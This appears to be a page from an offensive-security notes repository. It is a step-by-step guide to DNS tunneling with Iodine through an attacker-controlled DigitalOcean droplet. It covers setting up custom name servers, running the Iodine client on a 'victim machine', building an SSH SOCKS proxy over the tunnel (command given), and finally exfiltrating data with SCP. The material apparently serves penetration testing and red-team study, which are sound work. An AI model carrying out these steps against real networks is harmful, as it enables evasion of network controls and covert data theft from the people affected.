# DNS Tunneling
### With DigitalOcean Droplet and Iodine.
* Must have control over a public domain.
* Setup Internet host as DNS Server / tunnel endpoint, with [DigitalOcean Droplet](https://www.digitalocean.com/products/droplets)
* Create DNS tunnel with [Iodine](../../Tools/Tunneling/Iodine/README.md).
1) Create DNS host names (ns1 and ns2) that point to DigitalOcean Droplet's public IP.
2) Change the domain's name servers to "Custom" and point to the two hosts just created.
3) SSH into Droplet and [install Iodine](../../Tools/Tunneling/Iodine/README.md#Install-Iodine).
4) [Run Iodine daemon on Droplet](../../Tools/Tunneling/Iodine/README.md#Run-Iodine-daemon-to-listen-for-connections).
5) Check Internet connectiving with netcat.
```bash
nc www.google.com 80
```
6) Confirm the victim machine has a DNS server.
```bash
cat /etc/resolv.conf
```
7) Confirm DNS revolver will resolve a host on the Internet.
```bash
ping www.google.com
```
8) [Run Iodine on victim machine](../../Tools/Tunneling/Iodine/README.md#Run-Iodine-client-on-victim).
9) Create local, SSH, SOCKS proxy server, to encrypt traffic.
```bash
ssh user@10.0.0.1 -D10.0.0.2:1234 -N -C
# -D creates local port for proxy on port 1234, bound to local tunnel interface (10.0.0.2).
# -C enable compression
```
10) Configure Web browser to user SOCKS proxy.
* SOCKS Host: 10.0.0.2
* SOCKS Port: 1234
11) Use SCP to exfiltrate data over tunnel.

##### [Iodine](../../Tools/Tunneling/Iodine/README.md)

### DNS Tunneling References
##### [DNS Tunneling](https://beta.ivc.no/wiki/index.php/DNS_Tunneling)

# SSH Tunneling

# [VPN Tunneling](../VPN/README.md#Create-VPN-Tunnel)